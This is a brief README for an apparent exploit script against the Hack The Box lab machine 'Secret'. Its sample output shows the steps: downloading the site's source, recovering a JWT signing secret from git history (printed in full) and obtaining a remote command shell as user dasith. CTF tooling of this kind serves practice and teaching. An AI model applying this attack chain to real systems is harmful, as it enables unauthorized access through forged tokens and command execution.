# Usage:
Run the script `run.sh` to build and run a docker container to get a point of entry of the HTB machine "Secret":
```bash
$ ./run.sh <IP>
[*] Add target hostname into /etc/hosts
[*] Download the git repository from http://secret.htb/download/files.zip
[*] unzip the downlaod file "files.zip"
[*] Get the JWT token secret from the git commit history
[*] JWT token secret: gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
secret.htb> id
"uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n"
secret.htb>
```
